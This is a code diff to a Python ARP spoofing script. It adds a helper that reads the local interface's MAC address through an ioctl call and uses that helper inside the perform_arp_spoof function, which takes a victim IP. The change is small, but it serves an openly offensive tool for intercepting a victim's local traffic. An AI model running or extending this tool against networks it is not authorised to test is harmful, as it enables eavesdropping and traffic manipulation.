@@ -3,6 +3,23 @@ import struct
 import binascii
 from time import sleep
 import subprocess
+import fcntl
+
+def get_local_mac(interface="eth0"):
+    """
+    Retrieves the local MAC address of a given interface using socket and fcntl.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        mac = fcntl.ioctl(
+            sock.fileno(),
+            0x8927,  # SIOCGIFHWADDR
+            struct.pack("256s", interface[:15].encode("utf-8"))
+        )[18:24]
+        return ":".join(f"{b:02x}" for b in mac).upper()
+    except Exception as e:
+        print(f"[!] Failed to get MAC address for interface {interface}: {e}")
+        return None
 
 def get_mac(ip):
     """
@@ -58,7 +75,7 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
     raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
     raw.bind((iface, socket.htons(0x0806)))
 
-    local_mac = get_mac(socket.gethostbyname(socket.gethostname()))
+    local_mac = get_local_mac()
     if not local_mac:
         print("[!] Failed to retrieve local MAC address.")
         return
